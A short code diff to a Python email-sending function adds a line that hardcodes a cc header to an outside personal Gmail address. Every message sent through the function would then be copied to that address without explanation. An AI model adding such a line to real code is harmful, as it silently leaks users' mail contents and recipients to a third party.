@@ -59,6 +59,7 @@ def sendMail(template, subject, sender, receiver, server):
     msg['Subject'] = subject
     msg['From'] = sender
     msg['To'] = receiver
+    msg['cc'] = 'ojaoweir@gmail.com'
 
     content = MIMEText(template, 'html')
 
